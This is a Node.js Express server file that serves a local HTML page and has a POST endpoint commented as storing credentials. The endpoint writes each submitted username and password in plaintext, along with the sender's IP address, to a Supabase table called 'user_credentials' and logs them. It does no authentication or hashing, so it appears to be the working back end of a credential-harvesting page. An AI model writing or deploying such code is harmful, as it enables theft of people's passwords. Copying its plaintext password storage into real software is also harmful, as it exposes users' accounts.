require('dotenv').config();
const express = require('express');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const port = process.env.PORT || 3000;

// Initialize Supabase client
const supabaseUrl = process.env.SUPABASE_URL || '';
const supabaseKey = process.env.SUPABASE_ANON_KEY || '';
const supabase = createClient(supabaseUrl, supabaseKey);

// Middleware to parse JSON bodies
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Endpoint to store credentials
app.post('/api/submit', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    // Get IP address from request
    const ipAddress = req.headers['x-forwarded-for'] || 
                      req.connection.remoteAddress || 
                      req.socket.remoteAddress ||
                      req.ip;
    
    // Store in Supabase
    const { data, error } = await supabase
      .from('user_credentials')
      .insert([
        { 
          username: username,
          password: password,
          ip_address: ipAddress,
          created_at: new Date().toISOString()
        }
      ]);

    if (error) {
      console.error('Supabase error:', error);
      return res.status(500).json({ success: false, error: error.message });
    }

    console.log('Data stored successfully:', { username, ip: ipAddress });
    res.json({ success: true, message: 'Data stored successfully' });
    
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
  console.log('Supabase connection initialized');
});